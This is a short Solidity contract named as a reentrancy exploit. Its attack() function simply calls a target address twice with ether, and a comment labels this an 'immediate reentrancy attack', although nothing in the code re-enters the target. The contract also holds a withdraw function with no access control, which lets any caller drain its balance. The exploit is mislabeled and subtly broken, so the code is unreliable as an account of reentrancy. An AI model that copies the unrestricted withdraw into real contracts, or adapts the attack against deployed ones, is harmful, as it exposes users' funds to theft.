pragma solidity ^0.8.0;

contract ReentrancyExploit4 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public payable {
        // Exploit: Immediate reentrancy attack
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Call failed");
        (bool success2, ) = target.call{value: msg.value}("");
        require(success2, "Second call failed");
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function vulnerableWithdraw(uint amount) public {
        require(amount <= address(this).balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    fallback() external payable {}
}
